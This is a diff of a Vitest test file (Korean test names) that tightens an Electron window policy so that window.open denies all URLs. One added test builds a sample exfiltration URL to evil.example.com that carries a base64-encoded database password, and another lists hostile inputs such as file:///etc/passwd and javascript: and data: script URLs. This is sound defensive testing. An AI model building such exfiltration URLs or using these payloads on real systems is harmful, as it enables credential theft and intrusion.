@@ -1,7 +1,6 @@
 import { describe, expect, it, vi } from 'vitest'
 import {
   applyWindowPolicy,
-  isExternalNavigationAllowed,
   type WindowLike,
 } from '@main/security/windowPolicy'
 import { buildCspHeader } from '@main/security/csp'
@@ -42,7 +41,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -55,7 +53,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -68,44 +65,52 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     expect(fake.openWith('https://example.com/')).toEqual({ action: 'deny' })
   })
 
-  it('https 링크는 외부 브라우저로 넘긴다', () => {
-    const openExternal = vi.fn()
+  it('https 링크도 외부로 넘기지 않고 거부한다', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal,
     })
 
-    fake.openWith('https://example.com/docs')
-
-    expect(openExternal).toHaveBeenCalledWith('https://example.com/docs')
+    expect(fake.openWith('https://example.com/docs')).toEqual({ action: 'deny' })
   })
 
-  it('https가 아닌 스킴은 외부로 넘기지 않는다', () => {
-    const openExternal = vi.fn()
+  it('자격증명을 실어나르는 형태의 URL을 거부한다', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal,
     })
 
-    fake.openWith('file:///etc/passwd')
-    fake.openWith('javascript:alert(1)')
+    // 침해된 renderer가 시도할 법한 유출 형태.
+    const exfiltration = `https://evil.example.com/?d=${btoa('postgres://user:hunter2@host/db')}`
 
-    expect(openExternal).not.toHaveBeenCalled()
+    expect(fake.openWith(exfiltration)).toEqual({ action: 'deny' })
+  })
+
+  it('어떤 스킴이든 거부한다', () => {
+    const fake = createFakeWindow()
+    applyWindowPolicy(fake.window, {
+      allowedUrls: ['http://localhost:5173/'],
+    })
+
+    for (const url of [
+      'file:///etc/passwd',
+      'javascript:alert(1)',
+      'http://example.com/',
+      'data:text/html,<script>1</script>',
+    ]) {
+      expect(fake.openWith(url)).toEqual({ action: 'deny' })
+    }
   })
 
   it('webview 부착을 차단한다', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -118,7 +123,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -131,7 +135,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -144,7 +147,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -158,7 +160,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const suffixEvent = { preventDefault: vi.fn() }
@@ -174,7 +175,6 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
@@ -187,23 +187,12 @@ describe('applyWindowPolicy', () => {
     const fake = createFakeWindow()
     applyWindowPolicy(fake.window, {
       allowedUrls: ['http://localhost:5173/'],
-      openExternal: vi.fn(),
     })
 
     const event = { preventDefault: vi.fn() }
     fake.fire('will-navigate', event, 'http://localhost:5173')
 
     expect(event.preventDefault).not.toHaveBeenCalled()
-  })
-})
-
-describe('isExternalNavigationAllowed', () => {
-  it('https만 허용한다', () => {
-    expect(isExternalNavigationAllowed('https://example.com')).toBe(true)
-    expect(isExternalNavigationAllowed('http://example.com')).toBe(false)
-    expect(isExternalNavigationAllowed('file:///tmp/x')).toBe(false)
-    expect(isExternalNavigationAllowed('javascript:alert(1)')).toBe(false)
-    expect(isExternalNavigationAllowed('not-a-url')).toBe(false)
   })
 })
 
